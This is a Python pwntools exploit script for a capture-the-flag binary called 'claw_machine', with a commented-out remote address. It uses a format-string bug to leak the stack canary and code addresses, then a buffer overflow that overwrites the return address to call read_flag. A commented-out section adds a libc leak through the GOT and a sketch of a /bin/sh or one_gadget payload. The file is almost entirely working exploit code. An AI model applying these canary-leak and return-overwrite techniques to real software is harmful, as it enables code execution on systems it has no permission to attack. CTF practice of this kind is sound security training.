from pwn import *
from keystone import *

e = context.binary = ELF("./claw_machine")
l = e.libc
if args.GDB:
    p = e.debug(
        gdbscript="""
        b main
        b fb
        continue
    """)
else:
    p = e.process(stdin=process.PTY, stdout=process.PTY)

# p = remote("83.136.253.102", 32322)

# NX Enabled
# Stack Canary Enabled

# #1 Bug: Format string. We can use this to leak
# #2 Bug: Buffer overflow

# 1. Intentionally fail the game
p.readuntil(b'prize!\n\n>>')
p.sendline(b'1')
p.readuntil(b'prize!\n\n>>')
p.sendline(b'9')

# 2. Trigger Bug #1
p.readuntil(b'Would you like to rate our game? (y/n)\n\n>> ')
p.sendline(b'y')
p.readuntil(b'Enter your name: ')
# rsp-rbp = 0x80
# Stack canary is at 0x10 => distance = 0x70 => 14th element in stack => index 1 + 6 + 14 = 21st argument
p.send(b'%21$p!%23$p!')
p.readuntil(b'Thank you for giving feedback ')
q = p.readuntil(b'!', drop=True)
canary = int(q, 16)
q = p.readuntil(b'!', drop=True)
main_addr = int(q, 16)
e.address = main_addr - 53 - e.sym["main"]
print("Canary", hex(canary))
print("main addr", hex(e.address))
# print("target", hex(e.sym["fb"]))
p.readuntil(b'\nLeave your feedback here: ')

# 3. Trigger Bug #2
# It still works because we can override the last 6 bytes of the return address
fb_call = p64(e.sym["main"] + 0x30)
payload = (b''
    + b'A' * 0x48              # Feedback buffer
    + p64(canary)
    + b'R' * 8
    + p64(e.sym["read_flag"])
)[:0x5e]
p.send(payload)

p.interactive()

'''
# Experimental
# The following is for libc address leak, but it seems like we do not need it
# Alternatively, Jaquiez said we can use the libc leak to execute one_gadget

p.readuntil(b'Would you like to rate our game? (y/n)\n\n>> ')
p.sendline(b'y')
p.readuntil(b'Enter your name: ')
# 1 + 6 + 2 = 9th argument
p.send(b'%9$s!'.ljust(8, b'\x00') + p64(e.got["puts"]))
p.readuntil(b'Thank you for giving feedback ')
q = p.readuntil(b'!', drop=True)
puts_addr = s.unpack(b'q', q.ljust(8, b'\x00'))[0]
l.address = puts_addr - l.sym["puts"]
print("libc base", hex(l.address))
p.readuntil(b'\nLeave your feedback here: ')

sh = next(l.search(b"/bin/sh\x00"))
# Start of Feedback buffer is at 5th entry in stack, or 12th argument
payload2 = (b''
    + b'B' * 0x48
    + p64(canary)
    + b'S' * 8
    + p64(gadget)
)[:0x5e]
p.send(payload2)
'''
